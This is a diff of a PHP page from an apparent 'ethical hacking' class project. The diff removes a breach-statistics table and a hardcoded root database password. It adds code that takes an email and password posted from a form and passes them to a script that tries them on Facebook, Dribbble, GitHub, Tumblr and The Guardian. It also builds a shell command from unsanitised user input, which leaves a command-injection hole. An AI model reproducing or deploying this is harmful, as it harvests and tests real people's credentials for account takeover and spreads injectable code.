@@ -17,81 +17,28 @@ tr:nth-child(even) {
 }
 </style>";   
 
-$servername = "localhost";
-$username = "root";
-$password = "ethicalhacking";
-$db = "ethicalhackingteam2";
 
-// Create connection
 
-$conn = mysqli_connect($servername, $username, $password, $db);
-
-// Check connection
-if (!$conn) {
-    die("Connection failed: " . mysqli_connect_error());
-}
 
 // Call authentication script on the selected values
-$user = $_GET['username'];
-$pass = $_GET['password'];
+$user = $_POST['email'];
+$pass = $_POST['pass'];
 echo "<h3>Authentication:</h3>";
 
  
 echo "<p>Username: <strong>" . $user . "</strong>, Password: <strong>" . $pass . "</strong></p>";
 
-$sites = "";
+$sites = "facebook dribbble github tumblr theguardian";
 echo "<p>Attempting on: ";
-foreach ($_GET['breachSelector'] as $selectedOption) {
-    echo "<strong>" . $selectedOption . ",</strong>\n";
-    $sites = $sites . " " . $selectedOption;
-}
-echo "</p>";
-
-// Call command
 $cmd = "/var/www/html/EthicalHackingTeam2/Authentication/./Authenticate.py '" . $user . "' '" . $pass . "' " . $sites . " 2>&1";
-// echo $cmd;
 $output = shell_exec($cmd);
 echo $output;
 
-// Display the breach statistics - all of the users
-echo "<h3>Overall Breach Statistics:</h3>";
-$all = "SELECT * FROM " . $db;
-$result = mysqli_query($conn, $all);
+echo "</p>";
 
-if (!$result) {
-    die("Grabbing the entire table failed " . mysqli_error($conn)); 
-}
 
-// Format bool that is given from MySQL
-function displayBool($value) {
-    return $value != 0 ? "Success" : "Failed";
-}
+echo "<p> Now sending result file to </p>" . $user;
 
-// Create table to display statistics
-echo "<table>
-	<tr>
-	    <th>Username</th>
-	    <th>Password</th>
-        <th>Facebook</th>
- 	    <th>Dribbble</th>
- 	    <th>Github</th>
- 	    <th>Tumblr</th>
- 	    <th>TheGuardian</th>
- 	</tr>";
 
-while ($row = mysqli_fetch_array($result)) {
-    echo "<tr>
-          <td>" . $row['username'] . "</td>
- 	      <td>" . $row['password'] . "</td>
- 	      <td>" . displayBool($row['sites_breached_facebook']) . "</td>
- 	      <td>" . displayBool($row['sites_breached_dribbble']) . "</td>
- 	      <td>" . displayBool($row['sites_breached_github']) . "</td>
-   	      <td>" . displayBool($row['sites_breached_tumblr']) . "</td>
-   	      <td>" . displayBool($row['sites_breached_theguardian']) . "</td>
-  	  </tr>";
-} 
 
-echo "</table>";
-
-mysqli_close();
 ?>
